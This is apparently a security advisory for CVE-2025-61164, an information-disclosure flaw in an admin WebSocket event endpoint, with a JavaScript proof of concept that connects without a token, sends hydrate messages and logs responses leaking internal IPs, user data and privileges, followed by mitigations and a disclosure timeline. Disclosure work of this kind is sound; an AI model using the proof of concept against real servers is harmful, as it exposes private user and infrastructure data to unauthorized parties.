# CVE-2025-61164: Information Disclosure via WebSocket Endpoint Revealing Internal System Information

**CVE ID:** CVE-2025-61164 <br />
**Vulnerability Type:** Information Disclosure via WebSocket (CWE-200)<br />
**Severity:** High<br />
**Affected Component:** WebSocket Endpoint (`wss://example.com/admin/api/_event/?EIO=4&transport=websocket`)<br />
**Vendor:** Cohere<br />
**Discovered by:** Bahaa Dadoa — ViperX Security Research Team<br />
**Date Publicly Disclosed:** November 2025<br />

---

## Summary

An **Information Disclosure** vulnerability exists in the system's WebSocket endpoint that may reveal internal system information (for example: internal IP addresses, user details, HTTP headers, and privilege levels) to unauthorized actors. The endpoint returns sensitive data in responses that are not required by the client, exposing the system to reconnaissance and privilege escalation risks.

---

## Technical Description

The vulnerable WebSocket endpoint:

```plaintext
wss://example.com/admin/api/_event/?EIO=4&transport=websocket
```

The server responds with internal information in WebSocket messages. Because sensitive fields are included in responses and/or event payloads, an attacker connecting to the endpoint can receive data such as internal IPs, user lists, headers, and privilege information.

### Detailed Steps / Proof-of-Concept

1. Establish a WebSocket connection to the affected endpoint.
2. Send the initial handshake/subscribe messages as demonstrated below.
3. Observe the incoming messages which may contain sensitive internal details.

```javascript
const ws = new WebSocket("wss://example.com/admin/api/_event/?EIO=4&transport=websocket");

ws.onopen = () => {
  console.log("WebSocket connection opened");
  const initialMessage11 = '40/admin/api/_event,';
  ws.send(initialMessage11);
  console.log("Sent:", initialMessage11);

  const initialMessage2 = '42/admin/api/_event,["event",{"name":"reflex___state____state.hydrate","payload":{},"handler":null,"event_actions":{},"router_data":{"pathname":"/users","query":{},"asPath":"/users/"},"token":""}]';
  ws.send(initialMessage2);
  console.log("Sent:", initialMessage2);
};

ws.onmessage = (event) => {
  console.log("Received message:", event.data);
  // Inspect event.data for internal IPs, headers, user details, privileges, etc.
};

ws.onerror = (error) => {
  console.error("WebSocket error:", error);
};

ws.onclose = () => {
  console.log("WebSocket connection closed");
};
```

---

## Impact

* **Exposure of internal infrastructure:** internal IP addresses and hostnames may be leaked.  
* **User privacy risk:** user identifiers and profiles may be exposed.  
* **Privilege information leakage:** role or permission data could assist attackers in privilege escalation.  
* **Reconnaissance:** Attackers can use leaked information to map internal services or craft targeted attacks.

Severity is classified as **High** due to the sensitivity of the leaked information and the ease of exploitation.

---

## Root Cause

Responses returned by the WebSocket endpoint include unnecessary sensitive fields and lack filtering for what is safe to send to client-side consumers. The server-side logic fails to strip or redact internal-only data before sending event payloads.

---

## Recommendation / Mitigation

* Remove or redact sensitive fields (internal IPs, headers, privilege flags, internal identifiers) from WebSocket messages before sending to clients.  
* Ensure the server only returns data strictly required by the client-side application.  
* Apply server-side filtering or DTO mapping to separate internal models from client-facing payloads.  
* Enforce authentication and authorization checks for subscription channels and event streams.  
* Log and monitor unusual subscriptions or data access patterns on WebSocket endpoints.

---

## Disclosure Timeline

| Date       | Action                                          |
| ---------- | ----------------------------------------------- |
| 2025-09-04 | Vulnerability discovered and reported to vendor |
| 2025-09-05 | Vendor acknowledged receipt                     |
| 2025-10-01 | Vendor patch vulnerability                      |
| 2025-10-08 | CVE assigned                                    |
| 2025-11-03 | public disclosure                               |

---

## References

* [OWASP WebSocket Security Guidelines](https://owasp.org/www-community/WebSockets)  
* [CVE Program (MITRE)](https://cve.mitre.org/)  
* ViperX Security Research Team — [https://viperx.space](https://viperx.space)

---

## Credit

**Researcher:** Bahaa Dadoa<br />
**Organization:** ViperX Security Research Team<br />
**Website:** [https://viperx.space]<br />
